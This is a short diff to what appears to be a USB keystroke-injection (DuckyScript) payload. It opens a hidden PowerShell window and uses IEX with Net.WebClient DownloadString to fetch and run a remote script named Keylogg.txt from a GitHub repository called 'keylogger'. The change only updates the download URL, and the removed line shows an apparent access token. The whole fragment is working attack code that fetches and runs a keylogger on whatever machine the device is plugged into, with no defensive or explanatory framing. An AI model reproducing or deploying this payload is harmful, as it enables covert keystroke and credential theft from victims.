@@ -4,7 +4,7 @@ DELAY 50
 STRING powershell -WindowStyle hidden
 ENTER
 DELAY 100
-STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandaPoodle/keylogger/main/Keylogg.txt?token=GHSAT0AAAAAAB23A6S5NYRYXMC35KWRD7SIY3HZUOA')
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandaPoodle/keylogger/refs/heads/main/Keylogg.txt')
 DELAY 300
 ENTER
 DELAY 500
